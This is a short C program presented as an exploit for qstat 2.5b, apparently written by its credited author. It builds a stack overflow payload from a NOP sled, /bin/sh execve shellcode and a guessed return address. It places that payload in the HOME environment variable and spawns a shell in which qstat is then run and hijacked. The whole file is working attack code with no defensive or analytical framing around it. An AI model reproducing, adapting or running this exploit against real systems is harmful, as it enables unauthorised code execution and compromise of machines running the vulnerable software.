/* qstat.c - qstat 2.5b exploit
 *
 * Info:
 * Shellcode will be placed in HOME variable, and then a new shell will be
 * started. Start qstat in the new shell and voila! Qstat is exploited :)
 *
 * Test on Debian GNU/Linux (Woody) with offset 2000
 *
 * Oscar Linderholm <slime@home.se>
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

long
get_sp (void)
{
  __asm__ ("movl %esp, %eax");
}

int
main (int argc, char *argv[])
{
  char buffer[2048];
  long retaddr, offset;
  int i, j;

  if (argc != 2) {
    printf ("Usage: %s <offset>\n", argv[0]);
    return 0;
  }

  bzero (buffer, 2048);
  offset = atoi (argv[1]);
  retaddr = get_sp() + offset;

  for (i = 0; i < 995; i++)
    buffer[i] = '\x90';

  for (j = 0; j < strlen (shellcode); j++, i++)
    buffer[i] = shellcode[j];

  *(long *)&buffer[i] = retaddr;

  setenv ("HOME", buffer, 1);
  system ("/bin/sh");

  return 0;
}
